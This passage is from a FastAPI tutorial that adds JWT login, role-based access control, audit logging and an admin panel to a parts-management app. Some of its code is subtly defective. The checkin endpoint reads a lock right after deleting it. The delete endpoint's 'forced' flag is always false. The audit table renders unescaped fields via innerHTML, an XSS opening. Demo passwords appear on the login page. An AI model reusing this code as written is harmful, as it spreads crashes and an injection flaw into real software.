**Using FastAPI docs:**

1. Go to `http://127.0.0.1:8000/docs`
2. Find `POST /api/auth/login`
3. Click "Try it out"
4. Enter username: `john`, password: `password123`
5. Click "Execute"

---

## 5.8: Protected Endpoints - Requiring Authentication

### Create Dependency for Current User

Add to `main.py`:

```python
async def get_current_user(token: str = Depends(oauth2_scheme)) -> User:
    """
    Dependency to get the current authenticated user.

    Usage:
        @app.get("/protected")
        def protected_route(current_user: User = Depends(get_current_user)):
            # current_user is automatically verified
    """
    # Decode and verify token
    token_data = decode_access_token(token)

    # Get user from database
    user = get_user(token_data.username)
    if user is None:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="User not found",
        )

    # Return as Pydantic model (excludes password_hash)
    return User(
        username=user["username"],
        full_name=user["full_name"],
        role=user["role"]
    )
```

### Protect the Files Endpoint

Update your existing endpoint:

```python
@app.get("/api/files")
def get_files(current_user: User = Depends(get_current_user)):
    """
    Get all files - now requires authentication.
    """
    logger.info(f"Files requested by: {current_user.username}")

    if not REPO_PATH.exists():
        raise HTTPException(status_code=500, detail="Repository not found")

    locks = load_locks()
    all_items = os.listdir(REPO_PATH)
    files = []

    for filename in all_items:
        full_path = REPO_PATH / filename

        if full_path.is_file() and filename.endswith('.mcam'):
            if filename in locks:
                lock_info = locks[filename]
                status_val = "checked_out"
                locked_by = lock_info["user"]
            else:
                status_val = "available"
                locked_by = None

            files.append({
                "name": filename,
                "status": status_val,
                "size": full_path.stat().st_size,
                "locked_by": locked_by
            })

    return {"files": files}
```

### Test Protected Endpoint

**Without token (should fail):**

```bash
curl http://127.0.0.1:8000/api/files
```

**Response:**

```json
{ "detail": "Not authenticated" }
```

**With token (should succeed):**

```bash
### First, get token
TOKEN=$(curl -X POST http://127.0.0.1:8000/api/auth/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=john&password=password123" \
  | jq -r '.access_token')

### Use token
curl http://127.0.0.1:8000/api/files \
  -H "Authorization: Bearer $TOKEN"
```

**Now you get the files!**

---

## 5.9: Frontend Login Page

### Create Login HTML

Create `backend/static/login.html`:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PDM - Login</title>
    <link rel="stylesheet" href="/static/css/style.css" />
  </head>
  <body class="login-page">
    <div class="login-container">
      <div class="login-card">
        <h1>PDM System</h1>
        <p class="subtitle">Parts Data Management</p>

        <form id="login-form">
          <div class="form-group">
            <label for="username">Username:</label>
            <input
              type="text"
              id="username"
              name="username"
              required
              autocomplete="username"
              autofocus
            />
          </div>

          <div class="form-group">
            <label for="password">Password:</label>
            <input
              type="password"
              id="password"
              name="password"
              required
              autocomplete="current-password"
            />
          </div>

          <button type="submit" class="btn btn-primary btn-block">
            Log In
          </button>

          <div id="login-error" class="error-message hidden"></div>
        </form>

        <div class="login-info">
          <p><strong>Test Accounts:</strong></p>
          <p>
            Admin: username=<code>admin</code>, password=<code>admin123</code>
          </p>
          <p>
            User: username=<code>john</code>, password=<code>password123</code>
          </p>
        </div>
      </div>
    </div>

    <script src="/static/js/login.js"></script>
  </body>
</html>
```

### Login Page CSS

Add to `style.css`:

```css
/* ============================================
   LOGIN PAGE
   ============================================ */

.login-page {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
}

.login-container {
  width: 100%;
  max-width: 400px;
  padding: 2rem;
}

.login-card {
  background: white;
  padding: 3rem 2rem;
  border-radius: 12px;
  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
}

.login-card h1 {
  text-align: center;
  color: #667eea;
  margin-bottom: 0.5rem;
}

.subtitle {
  text-align: center;
  color: #666;
  margin-bottom: 2rem;
}

.btn-primary {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  width: 100%;
}

.btn-block {
  width: 100%;
  margin-top: 1rem;
}

.error-message {
  margin-top: 1rem;
  padding: 0.75rem;
  background: #f8d7da;
  color: #721c24;
  border: 1px solid #f5c6cb;
  border-radius: 4px;
}

.error-message.hidden {
  display: none;
}

.login-info {
  margin-top: 2rem;
  padding: 1rem;
  background: #f8f9fa;
  border-radius: 4px;
  font-size: 0.9rem;
}

.login-info code {
  background: #e9ecef;
  padding: 0.2rem 0.4rem;
  border-radius: 3px;
  font-family: "Courier New", monospace;
}
```

### Login JavaScript

Create `backend/static/js/login.js`:

```javascript
document.addEventListener("DOMContentLoaded", function () {
  // Check if already logged in
  const token = localStorage.getItem("access_token");
  if (token) {
    // Already logged in, redirect to main app
    window.location.href = "/";
    return;
  }

  // Handle login form
  const loginForm = document.getElementById("login-form");
  const errorDiv = document.getElementById("login-error");

  loginForm.addEventListener("submit", async (e) => {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    // Hide previous errors
    errorDiv.classList.add("hidden");

    try {
      // Create form data (OAuth2 requires form format, not JSON)
      const formData = new URLSearchParams();
      formData.append("username", username);
      formData.append("password", password);

      const response = await fetch("/api/auth/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: formData,
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.detail || "Login failed");
      }

      const data = await response.json();

      // Store token in localStorage
      localStorage.setItem("access_token", data.access_token);
      localStorage.setItem("token_type", data.token_type);

      // Redirect to main app
      window.location.href = "/";
    } catch (error) {
      console.error("Login error:", error);
      errorDiv.textContent = error.message;
      errorDiv.classList.remove("hidden");
    }
  });
});
```

### Understanding localStorage

**What is localStorage?**

- Browser API for storing data
- Persists even after browser closes
- Scoped to origin (domain + protocol)
- ~5-10MB storage limit
- Synchronous API (blocking)

**Methods:**

```javascript
// Store
localStorage.setItem("key", "value");

// Retrieve
const value = localStorage.getItem("key");

// Remove
localStorage.removeItem("key");

// Clear all
localStorage.clear();
```

**Security consideration:**

- Accessible by JavaScript (vulnerable to XSS)
- NOT secure storage for highly sensitive data
- Good for JWTs (which are signed, not encrypted)
- Alternative: `httpOnly` cookies (more secure, harder to use)

---

## 5.10: Protecting the Main App

### Update index.html to Check Auth

Modify `backend/static/index.html` - add this script at the TOP (before app.js):

```html
<script>
  // Check authentication before loading app
  (function () {
    const token = localStorage.getItem("access_token");
    if (!token) {
      // Not logged in, redirect to login
      window.location.href = "/login";
    }
  })();
</script>
```

### Update app.js to Include Token

Modify `loadFiles()` in `app.js`:

```javascript
async function loadFiles() {
  console.log("Loading files from API...");

  const loadingEl = document.getElementById("loading-indicator");
  const fileListEl = document.getElementById("file-list");

  loadingEl.classList.remove("hidden");
  fileListEl.classList.add("hidden");

  try {
    // Get token from localStorage
    const token = localStorage.getItem("access_token");

    const response = await fetch("/api/files", {
      headers: {
        Authorization: `Bearer ${token}`,
      },
    });

    // Check for authentication error
    if (response.status === 401) {
      // Token expired or invalid
      localStorage.removeItem("access_token");
      window.location.href = "/login";
      return;
    }

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const data = await response.json();
    allFiles = data.files;

    displayFilteredFiles();
  } catch (error) {
    console.error("Error loading files:", error);
    displayError("Failed to load files. Please refresh the page.");
  } finally {
    loadingEl.classList.add("hidden");
    fileListEl.classList.remove("hidden");
  }
}
```

### Add Logout Button

Add to `index.html` header:

```html
<header>
  <div class="header-content">
    <div>
      <h1>PDM System</h1>
      <p>Parts Data Management</p>
    </div>
    <button id="logout-btn" class="btn btn-secondary">Logout</button>
  </div>
</header>
```

### Header CSS

```css
.header-content {
  display: flex;
  justify-content: space-between;
  align-items: center;
  max-width: 1200px;
  margin: 0 auto;
}
```

### Logout Handler

Add to `app.js` (in DOMContentLoaded):

```javascript
// Logout button
document.getElementById("logout-btn").addEventListener("click", () => {
  localStorage.removeItem("access_token");
  localStorage.removeItem("token_type");
  window.location.href = "/login";
});
```

### Update FastAPI to Serve Login Page

Add to `main.py`:

```python
@app.get("/login")
def serve_login():
    """Serve the login page."""
    return FileResponse("static/login.html")
```

---

## Stage 5 Complete - Your App is Secure

### What You Built

You now have:

- Secure password hashing with bcrypt
- JWT-based authentication
- Login/logout functionality
- Protected API endpoints
- Session management in frontend
- User database with roles
- Token expiration handling

### Key Security Concepts Mastered

**Password Security:**

- Never store plain text passwords
- Bcrypt hashing with salts
- Timing attack protection
- Cost factor for brute-force defense

**JWT Authentication:**

- Token structure (header.payload.signature)
- Signing and verification
- Stateless authentication
- Token expiration

**Frontend Security:**

- Token storage in localStorage
- Authorization headers
- Redirect on authentication failure
- Secure logout

### Verification Checklist

- [ ] Cannot access main app without login
- [ ] Login with correct credentials works
- [ ] Login with wrong credentials fails
- [ ] Token is sent with API requests
- [ ] Expired/invalid token redirects to login
- [ ] Logout clears token
- [ ] Passwords are hashed in users.json
- [ ] Understand JWT structure
- [ ] Understand authentication flow

#

In **Stage 6**, we'll implement **Role-Based Access Control (RBAC)**:

- Admin-only endpoints (delete files, manage users)
- User permissions (only owner can checkin)
- UI elements that change based on role
- Audit logging for sensitive actions

Your app is now authenticated. Next, we add authorization.

---

### Stage 6: Role-Based Access Control (RBAC) - Authorization Deep Dive

## Introduction: The Goal of This Stage

You have authentication (users can log in), but everyone has the same permissions. An admin and a regular user can do exactly the same things. This is a security problem.

In this stage, you'll implement **authorization** - controlling what authenticated users can do based on their role.

By the end of this stage, you will:

- Understand RBAC theory and design patterns
- Implement role-based endpoint protection
- Create admin-only features (delete files, manage users)
- Enforce ownership rules (only lock owner can checkin)
- Build role-aware UI (admins see different buttons)
- Implement audit logging for sensitive actions
- Apply the Principle of Least Privilege
- Handle permission errors gracefully

**Time Investment:** 5-7 hours

---

## 6.1: Authorization Theory - The Access Control Matrix

### The Three Questions of Authorization

After authentication answers "Who are you?", authorization must answer three questions:

1. **What** is the user trying to do? (action: read, write, delete)
2. **Who** is trying to do it? (user identity and role)
3. **Is this allowed?** (permission check against rules)

### The Access Control Matrix

Imagine a spreadsheet:

|                 | File1                  | File2                  | User Management     | System Settings |
| --------------- | ---------------------- | ---------------------- | ------------------- | --------------- |
| **admin**       | Read, Write, Delete    | Read, Write, Delete    | Read, Write, Delete | Read, Write     |
| **john (user)** | Read, Write (if owner) | Read                   | None                | None            |
| **jane (user)** | Read                   | Read, Write (if owner) | None                | None            |

**This matrix defines every permission in the system.**

### RBAC - Simplifying the Matrix

**The Problem:** If you have 1,000 users and 10,000 files, your matrix has 10 million cells. Unmanageable.

**The Solution:** Role-Based Access Control (RBAC)

Instead of assigning permissions to individual users, you assign them to **roles**:

```
Roles:
  admin:
    - can_delete_any_file
    - can_manage_users
    - can_force_checkin
    - can_view_audit_logs

  user:
    - can_checkout_file
    - can_checkin_own_file
    - can_view_files
```

Then assign roles to users:

```
john → user role
admin → admin role
```

**Benefits:**

- Add new user? Just assign a role (instant permissions)
- Change permissions? Update the role (affects all users with that role)
- Scale to millions of users with only a handful of roles

### The Principle of Least Privilege

**Definition:** Every user should have the MINIMUM permissions needed to do their job, and nothing more.

**Example:**

- ❌ Give everyone admin access "just in case"
- ✓ Regular users can only checkout/checkin their own files
- ✓ Admins can override locks (for emergencies only)

**Why it matters:**

- Limits damage from compromised accounts
- Prevents accidental destructive actions
- Satisfies security compliance requirements

---

## 6.2: Implementing Role-Based Dependencies

### Create Role Checker Dependencies

Add to `main.py`:

```python
from typing import List
from fastapi import Depends, HTTPException, status

### ============================================
### ROLE-BASED DEPENDENCIES
### ============================================

def require_role(allowed_roles: List[str]):
    """
    Dependency factory for role-based access control.

    Usage:
        @app.delete("/api/admin/files/{filename}")
        def delete_file(
            filename: str,
            current_user: User = Depends(require_role(["admin"]))
        ):
            # Only admins can reach this code

    Args:
        allowed_roles: List of role names that can access the endpoint

    Returns:
        Dependency function that checks user role
    """
    async def role_checker(current_user: User = Depends(get_current_user)) -> User:
        if current_user.role not in allowed_roles:
            logger.warning(
                f"Access denied: {current_user.username} (role: {current_user.role}) "
                f"attempted to access endpoint requiring roles: {allowed_roles}"
            )
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail=f"Access denied. Required role: {', '.join(allowed_roles)}"
            )
        return current_user

    return role_checker

### Convenience dependencies for common cases
require_admin = require_role(["admin"])
require_user = require_role(["admin", "user"])  # Any authenticated user
```

### Understanding Dependency Factories

**What's happening here?**

```python
def require_role(allowed_roles: List[str]):
    def role_checker(current_user: User = Depends(get_current_user)) -> User:
        # Check logic
        return current_user
    return role_checker
```

This is a **factory function** - a function that creates and returns another function.

**Step by step:**

1. You call `require_role(["admin"])`
2. This CREATES a new function `role_checker` with `allowed_roles = ["admin"]` captured in closure
3. Returns that function
4. FastAPI uses the returned function as a dependency

**Why this pattern?**

Without the factory, you'd need separate functions for every role combination:

```python
### BAD - lots of duplication
def require_admin(current_user: User = Depends(get_current_user)):
    if current_user.role != "admin":
        raise HTTPException(403)
    return current_user

def require_moderator(current_user: User = Depends(get_current_user)):
    if current_user.role != "moderator":
        raise HTTPException(403)
    return current_user

### ... etc for every role
```

With the factory:

```python
### GOOD - one function, infinite combinations
require_admin = require_role(["admin"])
require_moderator = require_role(["moderator"])
require_admin_or_mod = require_role(["admin", "moderator"])
```

### HTTP Status Codes - 401 vs 403

```python
### 401 Unauthorized
raise HTTPException(status_code=401, detail="Not authenticated")

### 403 Forbidden
raise HTTPException(status_code=403, detail="Access denied")
```

**The difference:**

- **401 Unauthorized** - "I don't know who you are" (missing/invalid token)
- **403 Forbidden** - "I know who you are, but you can't do this" (insufficient permissions)

**The confusion:**

- "Unauthorized" sounds like it should be 403
- HTTP spec is misleading here
- Think of 401 as "Unauthenticated" and 403 as "Unauthorized"

---

## 6.3: Admin-Only Delete Endpoint

### Implement File Deletion

Add to `main.py`:

```python
@app.delete("/api/admin/files/{filename}")
def delete_file(
    filename: str,
    current_user: User = Depends(require_admin)
):
    """
    Delete a file - ADMIN ONLY.

    This is a destructive operation and should be carefully controlled.
    """
    logger.warning(
        f"DELETE request for '{filename}' by admin: {current_user.username}"
    )

    file_path = REPO_PATH / filename

    # Check if file exists
    if not file_path.exists():
        raise HTTPException(
            status_code=404,
            detail=f"File '{filename}' not found"
        )

    # Check if file is locked (optional - admins can override)
    locks = load_locks()
    if filename in locks:
        lock_info = locks[filename]
        logger.warning(
            f"Deleting locked file '{filename}' (was locked by {lock_info['user']})"
        )
        # Remove the lock
        del locks[filename]
        save_locks(locks)

    # Delete the file
    try:
        os.remove(file_path)
        logger.info(f"File deleted: '{filename}' by {current_user.username}")

        # Log to audit trail (we'll implement this soon)
        log_audit_event(
            user=current_user.username,
            action="DELETE_FILE",
            target=filename,
            details={"forced": filename in locks}
        )

        return {
            "success": True,
            "message": f"File '{filename}' deleted successfully"
        }

    except Exception as e:
        logger.error(f"Error deleting file '{filename}': {e}")
        raise HTTPException(
            status_code=500,
            detail="Failed to delete file"
        )
```

### Understanding the Admin Override

```python
if filename in locks:
    logger.warning(f"Deleting locked file...")
    del locks[filename]
    save_locks(locks)
```

**Why allow deleting locked files?**

**Scenario:** A user locks a file and goes on vacation. The file needs to be deleted urgently (corrupted, wrong part number, etc.).

**Solution:** Admins can override locks, but:

- It's logged with `logger.warning()` (visible in logs)
- Recorded in audit trail
- Should be rare (only for emergencies)

**This is the Principle of Least Privilege in action:**

- Regular users: Cannot delete ANY files
- Admins: Can delete files, even locked ones
- But even admins actions are logged (accountability)

---

## 6.4: Ownership-Based Authorization

### The Problem

Current checkin logic:

```python
if lock_info["user"] != request.user:
    raise HTTPException(403, detail="File locked by someone else")
```

This works, but it's hardcoded in the endpoint. Let's formalize ownership checks.

### Create Ownership Checker

Add to `main.py`:

```python
def check_file_ownership(
    filename: str,
    current_user: User,
    allow_admin_override: bool = True
) -> bool:
    """
    Check if user owns the lock on a file.

    Args:
        filename: Name of the file
        current_user: The current user
        allow_admin_override: If True, admins always pass (default: True)

    Returns:
        True if user owns the file lock, False otherwise

    Raises:
        HTTPException if file is not locked or user doesn't own it
    """
    locks = load_locks()

    # Check if file is locked
    if filename not in locks:
        raise HTTPException(
            status_code=400,
            detail=f"File '{filename}' is not checked out"
        )

    lock_info = locks[filename]

    # Admin override
    if allow_admin_override and current_user.role == "admin":
        logger.info(
            f"Admin override: {current_user.username} accessing "
            f"file locked by {lock_info['user']}"
        )
        return True

    # Check ownership
    if lock_info["user"] != current_user.username:
        raise HTTPException(
            status_code=403,
            detail=f"File is locked by {lock_info['user']}, not {current_user.username}"
        )

    return True
```

### Update Checkin Endpoint

```python
@app.post("/api/files/checkin")
def checkin_file(
    request: CheckinRequest,
    current_user: User = Depends(get_current_user)
):
    """
    Checkin a file (release lock).
    User must own the lock, unless they're an admin.
    """
    logger.info(f"Checkin request: {request.filename} by {current_user.username}")

    # Verify ownership (admins can override)
    check_file_ownership(request.filename, current_user, allow_admin_override=True)

    # Load locks
    locks = load_locks()

    # Remove lock
    del locks[request.filename]
    save_locks(locks)

    logger.info(f"File checked in: {request.filename}")

    # Audit log
    log_audit_event(
        user=current_user.username,
        action="CHECKIN_FILE",
        target=request.filename,
        details={"forced": locks[request.filename]["user"] != current_user.username}
    )

    return {
        "success": True,
        "message": f"File '{request.filename}' checked in"
    }
```

### Understanding the Design

**Why separate `check_file_ownership()` from the endpoint?**

**Benefits:**

1. **Reusability** - Use the same check in multiple endpoints
2. **Testability** - Easy to unit test the permission logic
3. **Clarity** - Endpoint code focuses on business logic, not permission checks
4. **Maintainability** - Change permission rules in one place

**This is the Separation of Concerns principle:**

- Endpoint: Orchestrates the operation
- `check_file_ownership()`: Handles permission logic
- `load_locks()`, `save_locks()`: Handle data persistence

---

## 6.5: Audit Logging - Tracking Sensitive Actions

### Why Audit Logs?

**Security requirements:**

- Compliance (SOC2, ISO 27001, GDPR)
- Forensics (who did what when)
- Anomaly detection (unusual admin activity)
- Accountability (prevents abuse of power)

**What to log:**

- WHO (user)
- WHAT (action)
- WHEN (timestamp)
- WHERE (target resource)
- HOW (success/failure, details)

### Create Audit Log Structure

Create `backend/audit_log.json`:

```json
[]
```

### Implement Audit Functions

Add to `main.py`:

```python
import uuid
from datetime import datetime, timezone

AUDIT_LOG_FILE = BASE_DIR / 'audit_log.json'

### ============================================
### AUDIT LOGGING
### ============================================

def log_audit_event(
    user: str,
    action: str,
    target: str,
    details: dict = None,
    status: str = "SUCCESS"
):
    """
    Log a security-relevant event to the audit log.

    Args:
        user: Username who performed the action
        action: Action type (e.g., "DELETE_FILE", "FORCE_CHECKIN")
        target: What was acted upon (filename, username, etc.)
        details: Additional context
        status: "SUCCESS" or "FAILURE"
    """
    event = {
        "id": str(uuid.uuid4()),
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "user": user,
        "action": action,
        "target": target,
        "details": details or {},
        "status": status
    }

    # Load existing log
    if AUDIT_LOG_FILE.exists():
        try:
            with open(AUDIT_LOG_FILE, 'r') as f:
                log = json.load(f)
        except json.JSONDecodeError:
            log = []
    else:
        log = []

    # Append event
    log.append(event)

    # Save log
    try:
        with open(AUDIT_LOG_FILE, 'w') as f:
            json.dump(log, f, indent=2)
    except Exception as e:
        logger.error(f"Failed to write audit log: {e}")
        # Don't raise - audit logging failure shouldn't break the operation

    logger.info(f"AUDIT: {user} - {action} - {target} - {status}")

def get_audit_log(
    limit: int = 100,
    user: str = None,
    action: str = None
) -> List[dict]:
    """
    Retrieve audit log entries.

    Args:
        limit: Maximum number of entries to return
        user: Filter by username (optional)
        action: Filter by action type (optional)

    Returns:
        List of audit log entries (most recent first)
    """
    if not AUDIT_LOG_FILE.exists():
        return []

    try:
        with open(AUDIT_LOG_FILE, 'r') as f:
            log = json.load(f)
    except json.JSONDecodeError:
        return []

    # Apply filters
    if user:
        log = [e for e in log if e["user"] == user]

    if action:
        log = [e for e in log if e["action"] == action]

    # Sort by timestamp (most recent first)
    log.sort(key=lambda e: e["timestamp"], reverse=True)

    # Limit results
    return log[:limit]
```

### Admin Endpoint to View Audit Log

```python
@app.get("/api/admin/audit-log")
def get_audit_log_endpoint(
    limit: int = 100,
    user: str = None,
    action: str = None,
    current_user: User = Depends(require_admin)
):
    """
    Retrieve audit log - ADMIN ONLY.

    Query parameters:
        limit: Max entries to return (default 100)
        user: Filter by username
        action: Filter by action type
    """
    logger.info(f"Audit log accessed by: {current_user.username}")

    entries = get_audit_log(limit=limit, user=user, action=action)

    return {
        "total": len(entries),
        "entries": entries
    }
```

### Understanding Audit Log Design

**Why UUID for event ID?**

```python
"id": str(uuid.uuid4())
### Example: "f47ac10b-58cc-4372-a567-0e02b2c3d479"
```

- **Globally unique** (no collisions, even across systems)
- **No sequence information** (can't guess next ID)
- **Standard format** (compatible with databases, APIs)

**Why ISO 8601 timestamps?**

```python
"timestamp": datetime.now(timezone.utc).isoformat()
### Example: "2025-10-03T20:30:45.123456+00:00"
```

- **Sortable** (string comparison works correctly)
- **Unambiguous** (includes timezone)
- **Standard** (widely supported)
- **Human-readable** (unlike Unix timestamps)

**Why not raise on audit log failure?**

```python
try:
    # Write to audit log
except Exception as e:
    logger.error(f"Failed to write audit log: {e}")
    # Don't raise - keep going
```

**The reasoning:**

- If audit logging fails, you still want the operation to succeed
- Example: Deleting a file should work even if audit log is full
- But you DO log the error (so admins can fix the audit system)

**Alternative view:**

- Some high-security systems DO fail the operation if audit fails
- "If we can't prove what happened, don't let it happen"
- Trade-off between availability and auditability

---

## 6.6: Role-Aware Frontend

### Check User Role on Login

Update `login.js`:

```javascript
const data = await response.json();

// Store token
localStorage.setItem("access_token", data.access_token);
localStorage.setItem("token_type", data.token_type);

// Decode JWT to get user info (we'll add a helper for this)
const payload = parseJWT(data.access_token);
localStorage.setItem("username", payload.sub);
localStorage.setItem("user_role", payload.role);

// Redirect to main app
window.location.href = "/";
```

### JWT Parsing Helper

Add to `login.js` and `app.js`:

```javascript
/**
 * Parse a JWT token (decode payload).
 * WARNING: This does NOT verify the signature!
 * Only use for extracting public info (username, role).
 * Server MUST verify the token.
 */
function parseJWT(token) {
  try {
    const base64Url = token.split(".")[1];
    const base64 = base64Url.replace(/-/g, "+").replace(/_/g, "/");
    const jsonPayload = decodeURIComponent(
      atob(base64)
        .split("")
        .map((c) => "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2))
        .join("")
    );
    return JSON.parse(jsonPayload);
  } catch (e) {
    console.error("Failed to parse JWT:", e);
    return null;
  }
}
```

### Understanding JWT Parsing

**Why this complex decoding?**

```javascript
const base64Url = token.split('.')[1];  // Get payload part
const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');  // URL-safe → standard Base64
const jsonPayload = decodeURIComponent(atob(base64)...);  // Base64 → UTF-8 JSON
return JSON.parse(jsonPayload);  // JSON → JavaScript object
```

**Base64URL vs Base64:**

- Standard Base64: Uses `+` and `/`
- Base64URL: Uses `-` and `_` (URL-safe)
- JWT uses Base64URL (can be in URLs without encoding)

**The `atob()` function:**

- "ASCII to Binary"
- Decodes Base64 string
- Built-in browser function

**Why `decodeURIComponent()`?**

- Handles UTF-8 characters correctly
- Without it, emojis and special characters break

**Security warning in the comment:**

- Parsing JWT in JavaScript does NOT verify it
- Anyone can decode a JWT (it's not encrypted!)
- Server MUST verify the signature
- Client-side parsing is ONLY for UI purposes

### Show/Hide Admin Features

Update `app.js`:

```javascript
// Get user role
const userRole = localStorage.getItem("user_role");
const isAdmin = userRole === "admin";

function createFileElement(file) {
  const div = document.createElement("div");
  div.className = "file-item";

  // ... file info section ...

  // Actions section
  const actionsDiv = document.createElement("div");
  actionsDiv.className = "file-actions";

  if (file.status === "available") {
    const checkoutBtn = document.createElement("button");
    checkoutBtn.className = "btn btn-checkout";
    checkoutBtn.textContent = "Checkout";
    checkoutBtn.onclick = () => handleCheckout(file.name);
    actionsDiv.appendChild(checkoutBtn);
  } else {
    const checkinBtn = document.createElement("button");
    checkinBtn.className = "btn btn-checkin";
    checkinBtn.textContent = "Checkin";
    checkinBtn.onclick = () => handleCheckin(file.name);
    actionsDiv.appendChild(checkinBtn);
  }

  // Admin-only delete button
  if (isAdmin) {
    const deleteBtn = document.createElement("button");
    deleteBtn.className = "btn btn-danger";
    deleteBtn.textContent = "Delete";
    deleteBtn.onclick = () => handleDelete(file.name);
    actionsDiv.appendChild(deleteBtn);
  }

  div.appendChild(infoDiv);
  div.appendChild(actionsDiv);

  return div;
}
```

### Delete Button CSS

Add to `style.css`:

```css
.btn-danger {
  background: #dc3545;
}

.btn-danger:hover {
  background: #c82333;
}
```

### Delete Handler

Add to `app.js`:

```javascript
async function handleDelete(filename) {
  // Double confirmation for destructive action
  if (!confirm(`Are you sure you want to DELETE "${filename}"?`)) {
    return;
  }

  if (!confirm("This action cannot be undone. Delete file?")) {
    return;
  }

  try {
    const token = localStorage.getItem("access_token");

    const response = await fetch(`/api/admin/files/${filename}`, {
      method: "DELETE",
      headers: {
        Authorization: `Bearer ${token}`,
      },
    });

    if (response.status === 403) {
      showNotification("Access denied. Admin privileges required.", "error");
      return;
    }

    if (response.ok) {
      showNotification(`File "${filename}" deleted successfully`, "success");
      loadFiles();
    } else {
      const error = await response.json();
      showNotification(error.detail || "Delete failed", "error");
    }
  } catch (error) {
    console.error("Delete error:", error);
    showNotification("Network error", "error");
  }
}
```

### Understanding Client-Side Security

**Why hide the delete button for non-admins?**

```javascript
if (isAdmin) {
  // Show delete button
}
```

**This is NOT security!** This is **UX**.

**Why not security?**

- Client-side code is fully visible (View Source)
- User can modify JavaScript (browser dev tools)
- User can call the API directly (curl, Postman)

**Real security:**

```python
@app.delete("/api/admin/files/{filename}")
def delete_file(current_user: User = Depends(require_admin)):
    # Server checks role - THIS is security
```

**The rule:**

- **Client-side:** Hide UI elements for better UX
- **Server-side:** Enforce permissions for security

**Never trust the client!**

---

## 6.7: Admin Panel

### Create Admin Page

Create `backend/static/admin.html`:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PDM - Admin Panel</title>
    <link rel="stylesheet" href="/static/css/style.css" />
  </head>
  <body>
    <header>
      <div class="header-content">
        <div>
          <h1>Admin Panel</h1>
          <p>System Administration</p>
        </div>
        <div class="header-actions">
          <a href="/" class="btn btn-secondary">Back to Files</a>
          <button id="logout-btn" class="btn btn-secondary">Logout</button>
        </div>
      </div>
    </header>

    <main>
      <section>
        <h2>Audit Log</h2>
        <div class="controls-row">
          <div class="filter-group">
            <label for="log-limit">Show:</label>
            <select id="log-limit" class="filter-select">
              <option value="50">Last 50</option>
              <option value="100" selected>Last 100</option>
              <option value="500">Last 500</option>
            </select>
          </div>
          <button id="refresh-log-btn" class="btn">Refresh</button>
        </div>

        <div id="audit-log">
          <p>Loading audit log...</p>
        </div>
      </section>
    </main>

    <script>
      // Check admin role
      const userRole = localStorage.getItem("user_role");
      if (userRole !== "admin") {
        alert("Access denied. Admin privileges required.");
        window.location.href = "/";
      }
    </script>
    <script src="/static/js/admin.js"></script>
  </body>
</html>
```

### Admin JavaScript

Create `backend/static/js/admin.js`:

```javascript
document.addEventListener("DOMContentLoaded", function () {
  loadAuditLog();

  // Refresh button
  document
    .getElementById("refresh-log-btn")
    .addEventListener("click", loadAuditLog);

  // Limit selector
  document.getElementById("log-limit").addEventListener("change", loadAuditLog);

  // Logout
  document.getElementById("logout-btn").addEventListener("click", () => {
    localStorage.clear();
    window.location.href = "/login";
  });
});

async function loadAuditLog() {
  const limit = document.getElementById("log-limit").value;
  const token = localStorage.getItem("access_token");
  const container = document.getElementById("audit-log");

  container.innerHTML = "<p>Loading...</p>";

  try {
    const response = await fetch(`/api/admin/audit-log?limit=${limit}`, {
      headers: {
        Authorization: `Bearer ${token}`,
      },
    });

    if (response.status === 403) {
      container.innerHTML =
        '<p class="error">Access denied. Admin privileges required.</p>';
      return;
    }

    if (!response.ok) {
      throw new Error("Failed to load audit log");
    }

    const data = await response.json();
    displayAuditLog(data.entries);
  } catch (error) {
    console.error("Error loading audit log:", error);
    container.innerHTML = '<p class="error">Failed to load audit log.</p>';
  }
}

function displayAuditLog(entries) {
  const container = document.getElementById("audit-log");

  if (!entries || entries.length === 0) {
    container.innerHTML = "<p>No audit log entries found.</p>";
    return;
  }

  const table = document.createElement("table");
  table.className = "audit-table";

  // Header
  table.innerHTML = `
        <thead>
            <tr>
                <th>Timestamp</th>
                <th>User</th>
                <th>Action</th>
                <th>Target</th>
                <th>Status</th>
            </tr>
        </thead>
        <tbody></tbody>
    `;

  const tbody = table.querySelector("tbody");

  // Rows
  entries.forEach((entry) => {
    const row = document.createElement("tr");
    row.innerHTML = `
            <td>${formatTimestamp(entry.timestamp)}</td>
            <td>${entry.user}</td>
            <td>${entry.action}</td>
            <td>${entry.target}</td>
            <td class="status-${entry.status.toLowerCase()}">${
      entry.status
    }</td>
        `;
    tbody.appendChild(row);
  });

  container.innerHTML = "";
  container.appendChild(table);
}

function formatTimestamp(isoString) {
  const date = new Date(isoString);
  return date.toLocaleString();
}
```

### Audit Table CSS

Add to `style.css`:

```css
/* ============================================
   AUDIT LOG TABLE
   ============================================ */

.audit-table {
  width: 100%;
  border-collapse: collapse;
  margin-top: 1rem;
}

.audit-table th {
  background: #f8f9fa;
  padding: 0.75rem;
  text-align: left;
  font-weight: 600;
  border-bottom: 2px solid #dee2e6;
}

.audit-table td {
  padding: 0.75rem;
  border-bottom: 1px solid #dee2e6;
}

.audit-table tr:hover {
  background: #f8f9fa;
}

.status-success {
  color: #28a745;
  font-weight: 600;
}

.status-failure {
  color: #dc3545;
  font-weight: 600;
}

.header-actions {
  display: flex;
  gap: 0.5rem;
}
```

### Add Link to Admin Panel

Update `index.html` header (for admins):

```html
<header>
  <div class="header-content">
    <div>
      <h1>PDM System</h1>
      <p>Parts Data Management</p>
